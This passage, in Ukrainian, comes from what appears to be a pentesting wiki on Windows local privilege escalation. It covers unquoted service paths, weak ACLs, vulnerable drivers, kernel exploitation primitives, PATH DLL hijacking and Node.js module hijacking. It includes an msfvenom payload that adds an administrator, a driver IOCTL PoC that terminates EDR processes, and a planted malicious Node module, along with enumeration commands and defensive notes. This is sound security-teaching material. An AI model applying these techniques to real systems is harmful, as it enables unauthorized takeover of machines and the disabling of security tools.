{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Якщо шлях до виконуваного файла не взято в лапки, Windows намагатиметься виконати кожну частину шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows намагатиметься виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Перелічіть усі шляхи служб, не взяті в лапки, за винятком шляхів вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам указувати дії, які потрібно виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на бінарний файл. Якщо цей бінарний файл можна замінити, може бути можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для активного завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного аргументу-файлу інтерпретатора, наприклад PowerShell `-File`. Якщо запланований batch-файл містить прямий виклик PowerShell `-File`, також перевірте ACL зазначеного скрипту; змінні, умовні конструкції та ланцюжки команд оболонки потрібно відстежувати вручну. Скрипт або батьківський каталог, доступний для запису поточному користувачу, є зачіпкою для виконання в контексті іншого облікового запису лише тоді, коли налаштований principal завдання відрізняється від поточного користувача і завдання фактично доходить до цієї дії. ACL лише з правом додавання даних може мати значення для скриптів, але попередній `exit` або інший потік керування може зробити додані рядки недосяжними. Перш ніж стверджувати про підвищення привілеїв, перевірте ефективні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику керування програмами. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

У NTFS файл, доступний для читання, може мати іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликого набору доступних і доречних резервних копій або файлів конфігурації спершу перегляньте **назви та розміри** потоків, перш ніж відкривати будь-який їхній вміст; Windows надає до них доступ через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на секрет, — лише зачіпка. Перевірте ефективний доступ до читання файлу, підтримку потоків файловою системою, наявність у потоці придатних до використання облікових даних і обліковий запис, для автентифікації від імені якого вони використовуються. Під час звичайного переліку уникайте рекурсивного сканування потоків і виведення їхнього вмісту.

## Вхідні файли допоміжного засобу Windows Driver Kit для запланованих завдань

До складу необов’язкового Windows Driver Kit входить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` із каталогу запуску. Заплановане завдання або служба, що запускає цей допоміжний засіб із привілейованим обліковим записом, може перетворити доступ низькопривілейованого користувача до запису в ці файли на виконання команд у контексті цього облікового запису, навіть якщо сам виконуваний файл допоміжного засобу захищено. Переконайтеся, що споживач має привілеї і що **обидва** супровідні файли можна створити або змінити; самого виявлення допоміжного засобу недостатньо.

Для запланованого завдання перевірте його дію [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) і ACL двох шляхів до супровідних файлів. Якщо в завданні не вказано робочий каталог, каталог виконуваного файлу — це лише зачіпка для перевірки, а не доказ того, що завдання читає вхідні файли саме звідти. Також має бути виконано вимогу щодо файлу проєкту. Перевірте фактичний principal завдання, а не припускайте, що воно запускається від імені SYSTEM.

## Програми

### Встановлені програми

Перевірте **дозволи для бінарних файлів** (можливо, один із них можна перезаписати й підвищити привілеї) і для **каталогів** ([DLL Hijacking](dll-hijacking/index.html).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях відновлення Windows-агента Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших Windows-агентів Checkmk, які записували файли команд у `C:\Windows\Temp`, а в разі невдалої заміни запускали вже наявний файл, захищений від запису. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень встановлених виправлень і чи може виконуватися вразлива операція агента; сама лише позначка гілки, наприклад `2.1`, не дає змоги визначити наявність вразливості. Під час переліку можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби SAML в ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася ADSelfService Plus версії 6210 і старіших; постачальник виправив її у версії 6211. Вона актуальна лише за умови, що SAML SSO **увімкнено або було увімкнено раніше**. Тому запис про встановлений продукт або шлях до служби — це зачіпка, а не підтвердження вразливості: перевірте точну версію, історію конфігурації SAML, доступність служби з мережі та обліковий запис, від імені якого вона працює. Виконання коду через службу відбувається з привілеями цього облікового запису; для виконання від імені SYSTEM екземпляр має працювати від імені SYSTEM. Доступний для читання файл `OfflineBackup_*.ezip` у каталозі Backup продукту — це окрема зачіпка щодо зашифрованої резервної копії, а не доказ наявності придатних облікових даних чи цієї вразливості SAML. Під час звичайного переліку зафіксуйте його шлях і права доступу, не розпаковуючи файл.

#### Межі контролера Jenkins і доменного облікового запису

На контролері Jenkins під Windows розрізняйте право створювати або налаштовувати завдання та право запускати його: [у документації Jenkins ці права наведено окремо як `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер можуть забезпечити інший спосіб запуску збірки, але перевірте, що він увімкнений і збірка справді виконується. Код запускається від імені контролера або вибраного агента, а збережені облікові дані можна використати лише тоді, коли завдання має доступ до їхньої області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає матеріали облікових даних і ключі шифрування у файлах `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([сховище секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сам факт їх наявності не розкриває пароль; перевірте **доступ на читання до потрібних файлів** і наявність окремого шляху повторного використання облікового запису, не виводячи секрети у спільний вивід. Якщо цей обліковий запис має право запису в `scriptPath` об’єкта користувача AD, перевірте, що шлях доступний для запису, а реальний процес входу або планувальник завдань використовує його від імені цільового користувача, перш ніж вважати це виконанням від імені іншого користувача. Для додаткового контролю груп необхідно окремо перевірити фактичні ефективні права AD.

#### Ідентифікація self-hosted-агента Azure Pipelines

Для Azure DevOps Server або проєкту Azure Pipelines розрізняйте дозвіл **створювати або редагувати** pipeline, дозвіл **ставити його в чергу** та дозвіл використовувати вибраний пул агентів; [Microsoft окремо документує дозволи pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулів](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може додати крок зі скриптом і запустити pipeline на self-hosted-агенті Windows, цей крок виконується від імені [налаштованого облікового запису операційної системи агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж заявляти про перехід між користувачами або до SYSTEM, перевірте конкретний pipeline, обмеження гілок і ресурсів, авторизований пул, завдання, яке можна запустити, та ідентифікатор служби агента. Встановлений агент, роль у проєкті або право запису до репозиторію — це лише зачіпки; під час пасивного переліку перевіряйте дозволи й локальні метадані служб, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та який має доступ до її бази даних SQL, і **обліковий запис конектора AD DS**, права якого в каталозі залежать від налаштованих функцій синхронізації. Облікові дані конектора зберігаються в зашифрованому вигляді в цій базі даних, а ключовий матеріал [захищений за допомогою DPAPI від імені облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Наявність встановленої служби синхронізації, групи з назвою, що натякає на права локального адміністратора, або самого лише доступу до бази даних не підтверджує можливості розшифрувати облікові дані чи підвищити привілеї в домені. Окремо перевірте фактичні права на читання бази даних, доступ облікового запису служби до ключа, структуру інсталяції та SQL, налаштовану ідентичність конектора й ефективні привілеї цієї ідентичності в AD. Під час звичайного переліку показуйте лише метадані служби та доступу, не запитуйте й не виводьте збережені секрети.

#### Дозволи для бібліотек підтримки драйверів принтера

Встановлений драйвер принтера може зберігати бібліотеки DLL підтримки в `C:\ProgramData` і завантажувати їх у привілейованому процесі друку. Перевірте ACL точного каталогу драйвера та файлів DLL, зокрема батьківських каталогів і точок повторної обробки, навіть якщо перелік принтерів через WMI недоступний. Для [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказаним шляхом був `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [первинне повідомлення про вразливість](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) описує завантаження DLL процесом `PrintIsolationHost.exe`. ACL, що дозволяє запис, — це лише зачіпка: перевірте ефективне право запису з урахуванням заборонних записів, наявність відповідного драйвера та завантаження ним файлу з привілейованою ідентичністю, а також чи виправлено проблему в оновленому драйвері або програмі безпеки постачальника. Не робіть висновків про вразливість лише за назвою каталогу чи версією драйвера.

### Права на запис

Перевірте, чи можете змінити якийсь файл конфігурації, щоб прочитати певний спеціальний файл, або змінити виконуваний файл, який запускається від імені облікового запису адміністратора (schedtasks).

Щоб знайти в системі каталоги або файли зі слабкими дозволами, виконайте:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/виконання через автозавантаження плагінів Notepad++

Notepad++ автоматично завантажує будь-яку DLL плагіна з підкаталогів `plugins`. Якщо доступна портативна/копійована інсталяція з правом запису, розміщення шкідливого плагіна забезпечує автоматичне виконання коду в `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете перезаписати якийсь розділ реєстру або бінарний файл, який виконуватиме інший користувач.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **розташування autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте потенційно **дивні/вразливі драйвери сторонніх виробників**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в пам’ять ядра (що часто трапляється в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши SYSTEM-токен із пам’яті ядра.<sup>[[13]](#references)</sup> Покрокову техніку описано тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Пов’язані матеріали з kernel exploitation у Windows:

Про випадок із kernel-mode ring-buffer та доступними для запису з user mode регістрами читання/запису див. [варіант із USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Для race condition уразливостей, коли вразливий виклик відкриває контрольований атакувальником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити проміжок із мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF у cancel-safe queue, розкриття даних із paged pool і pivots через I/O ring

Деякі ланцюжки LPE у ядрі Windows можна побудувати з двох окремо слабких уразливостей: **race condition у життєвому циклі cancel-safe queue**, що звільняє запит/CBD, поки блокування черги ще утримується, і розкриття даних через **звільнення блокування перед копіюванням**, яке робить leak звільненого виділення paged pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки щодо аудиту та експлуатації:

- **Звільнення під блокуванням + подальше скасування**: шукайте шлях успішного виконання з послідовністю **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування має послідовність **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання доходить до `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до звільнення блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може згодом продовжити виконання й передати звільнений `PFLT_CALLBACK_DATA` назад у callback драйвера для видалення.
- **Перехопіть звільнений об’єкт черги** виділенням paged pool такого самого розміру, контрольованим атакувальником. Елементи черги даних `NPFS` корисні, оскільки вміст і розмір можна контролювати, а згодом перевіряти через операції читання/перегляду даних у pipe. Якщо звільнений об’єкт містить посилання на список, перезапишіть їх **циклічним списком фальшивих вузлів запиту в пам’яті user mode**, щоб драйвер багаторазово обробляв структури запитів, визначені атакувальником, замість завершення на початковій голові списку.
- **Розширте можливості передбачуваного запису**: якщо фальшивий запит перенаправляє вкладений вказівник контексту, який використовують записи для обліку (часові мітки / QPC / поля поруч із лічильником посилань), можна отримати запис у ядро, де адресу контролює атакувальник, а значення — ні. У такому разі націльтеся на поле **довжини/розміру** об’єкта, розміщеного в pool через spray, а не на кінцевий вказівник на код/дані, а потім переберіть об’єкти у spray, доки пошкоджений об’єкт не дасть змогу читати за межами виділення paged pool.
- **Шаблон уразливості з розкриттям даних унаслідок race condition**: будь-який syscall із кодом `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` — перспективний кандидат. Надійність зростає, якщо атакувальник може збільшити буфер, що копіюється (наприклад, додавши багато елементів списку/ресурсів, які збільшують кінцевий розмір виділення серіалізатора), оскільки довше копіювання розширює вік для підміни без обов’язкового падіння системи.
- **Цілі для повторного заповнення, насичені вказівниками**: зареєстровані масиви буферів Windows **I/O ring** — чудові цілі для розкриття даних, оскільки їхній розмір у paged pool контролюється атакувальником (`8 * regBufferCnt`), а кожен елемент є вказівником ядра на `_IOP_MC_BUFFER_ENTRY`. Зробіть leak одного з таких масивів, визначте розташований поруч `IORING_OBJECT`, а потім пошкодьте **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені атакувальником записи й забезпечували довільне читання/запис у пам’ять ядра. Якщо доступний запис змінює лише стабільний байт (наприклад, із `KUSER_SHARED_DATA+0x14`), використайте **перекривні невирівняні записи**, щоб сформувати вказівник user mode з повторюваним байтом, наприклад `0x0101010101010101`, відобразіть його через `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні індикатори для налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Щойно отримаєте довільне читання/запис у kernel через пошкоджений I/O ring, викрадіть SYSTEM token за допомогою стандартного workflow після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті куща реєстру

Сучасні вразливості кущів реєстру дають змогу формувати детерміновані розкладки пам’яті, зловживати записуваними дочірніми ключами HKLM/HKU та перетворювати пошкодження метаданих на переповнення kernel paged pool без власного драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у direct mode `RtlQueryRegistryValues` через контрольовані зловмисником шляхи

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише, чи є він коректним рядком UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` із `RTL_QUERY_REGISTRY_DIRECT`, передаючи адресу скалярної змінної в стеку, наприклад `int readValue`. Якщо `RTL_QUERY_REGISTRY_TYPECHECK` відсутній, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не типу, на який розраховував розробник.

Це дає два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу опитувати вибрані зловмисником ключі, розкривати їхню наявність через коди повернення/журнали та іноді читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: скалярне призначення на кшталт `&readValue` може інтерпретуватися з іншим типом — як `REG_QWORD`, `UNICODE_STRING` або буфер заданого розміру — залежно від типу значення реєстру.

Практичні примітки щодо експлуатації:

- **Захист у Windows 8+**: якщо запит звертається до **недовіреного куща реєстру** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з боку ядра призводять до аварійного завершення з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **ключі, доступні для запису зловмиснику, у довірених системних кущах**, а не створюйте значення в `HKCU`.
- **Розміщення даних у довіреному кущі**: скористайтеся NtObjectManager, щоб знайти доступні для запису дочірні ключі `\Registry\Machine`, а потім повторіть пошук із дублікатом token із **низьким рівнем цілісності**, щоб знайти ключі, доступні із sandboxed контекстів:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека й може частково перезаписати сусідній callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: у прямому режимі очікується, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований атакувальником `REG_DWORD` у скаляр на стеку, а потім повторно використовує той самий буфер для читання рядка, атакувальник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що дає змогу виконати частково контрольований запис у kernel.
- **`REG_BINARY`**: для великих двійкових даних прямий режим трактує перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає в повторно використаному скалярі контрольоване атакувальником **від’ємне** значення, наступний запит `REG_BINARY` копіює байти атакувальника безпосередньо поверх сусідніх комірок стека — це часто найпростіший спосіб повністю перезаписати callback pointer.

Характерна ознака для пошуку: **читання різнотипних значень реєстру в ту саму змінну на стеку без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використовувані вказівники `EntryContext` і шляхи виконання, де перше читання з реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN на об’єктах пристроїв (LPE + EDR kill)

Деякі підписані драйвери сторонніх розробників створюють об’єкт пристрою з надійним SDDL за допомогою IoCreateDeviceSecure, але забувають установити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, якщо пристрій відкривають через шлях із додатковим компонентом. Тож будь-який непривілейований користувач може отримати handle, використавши шлях простору імен на кшталт:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, можна зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в роботу системи. Приклади можливостей, виявлених у реальних випадках:
- Повернення handle із повним доступом до довільних процесів (крадіжка токена / оболонка SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис необроблених даних диска (втручання в систему офлайн, прийоми для забезпечення стійкості під час завантаження).
- Завершення довільних процесів, зокрема Protected Process/Light (PP/PPL), що дає змогу з user land завершувати роботу AV/EDR через kernel.

Мінімальний шаблон PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Заходи пом’якшення для розробників
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має обмежуватися за допомогою DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте брокерні моделі замість прямих привілеїв ядра.

Ідеї для виявлення загроз захисниками
- Відстежуйте відкриття підозрілих імен пристроїв з режиму користувача (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що можуть свідчити про зловживання.
- Застосовуйте список заблокованих вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і ведіть власні списки дозволених і заборонених об’єктів.


## Викрадення DLL через PATH

Якщо у вас є **дозвіл на запис у папку, зазначену в PATH**, ви можете перехопити DLL, завантажену процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Щоб дізнатися більше про зловживання цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **неконтрольованого шляху пошуку у Windows**, який стосується програм **Node.js** та **Electron**, коли вони виконують імпорт без зазначення шляху, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, рухаючись угору деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тож програма, запущена з `C:\Users\Administrator\project\app.js`, може зрештою перевірити такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий файл `foo.js` (або папку пакета) й чекати, доки **процес Node/Electron із вищими привілеями** спробує знайти відсутню залежність. Payload виконається в контексті безпеки процесу-жертви, тож це призводить до **LPE**, якщо цільова програма працює від імені адміністратора, із підвищеної запланованої задачі чи обгортки служби або як привілейована програма робочого столу з автозапуском.

Це особливо поширено, коли:

- залежність вказана в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу після помилки
- пакет видалили зі збірок для production, не включили під час пакування або не вдалося встановити
- вразливий виклик `require()` міститься глибоко в дереві залежностей, а не в коді основної програми

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях пошуку:<sup>[[23]](#references)</sup>

- Встановіть фільтр `Process Name` = виконуваний файл цільової програми (`node.exe`, EXE-файл програми Electron або процес-обгортка)
- Встановіть фільтр `Path` `contains` `node_modules`
- Звертайте увагу на `NAME NOT FOUND` і останнє успішне відкриття в `C:\node_modules`

Корисні шаблони для code review у розпакованих файлах `.asar` або вихідному коді програми:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Експлуатація

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо його ще не існує:

```powershell
mkdir C:\node_modules
```

3. Розмістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть застосунок-жертву. Якщо застосунок спробує виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

До реальних прикладів відсутніх необов’язкових модулів, що відповідають цьому шаблону, належать `bluebird` і `utf-8-validate`, але повторно застосовною є саме **техніка**: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows Node/Electron намагатиметься знайти.

### Ідеї щодо виявлення та посилення захисту

- Створіть сповіщення про створення користувачем `C:\node_modules` або записування туди нових файлів/пакетів `.js`.
- Шукайте процеси з високим рівнем цілісності, які читають файли з `C:\node_modules\*`.
- Додавайте всі runtime-залежності до production-збірки й перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на шаблони на кшталт `try { require("...") } catch {}`, які не виводять повідомлень про помилки.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, у деяких розгортаннях `ws` можна уникнути застарілої перевірки `utf-8-validate`, задавши `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи не прописані жорстко у файлі hosts інші відомі комп’ютери.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте ззовні служби з обмеженим доступом.

```bash
netstat -ano #Opened ports?
```

Для локального слухача зіставте його PID із власником процесу, шляхом до виконуваного файла та службою або запланованим завданням, яке його запускає. Служба віддаленого керування може надати доступ від імені свого користувача робочого стола лише за умови, що це дозволяють її автентифікація та засоби керування командами. Користувацька TCP-програма, що працює з обліковим записом із вищими привілеями, потребує окремої перевірки: слухач і шлях до бінарного файла — це лише пасивні підказки, тоді як для виявлення шляху до автентифікованого пошкодження пам’яті потрібен аналіз саме цього бінарного файла та доступних для нього вхідних даних. Якщо здається, що відкритий порт належить системному процесу, перевірте його за допомогою [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), перш ніж визначати службу на серверній частині; саме по собі правило перенаправлення не доводить, що цільова служба доступна або вразлива.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку з командами для роботи з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для перерахування мережі тут](../basic-cmd-for-pentesters.md#network)

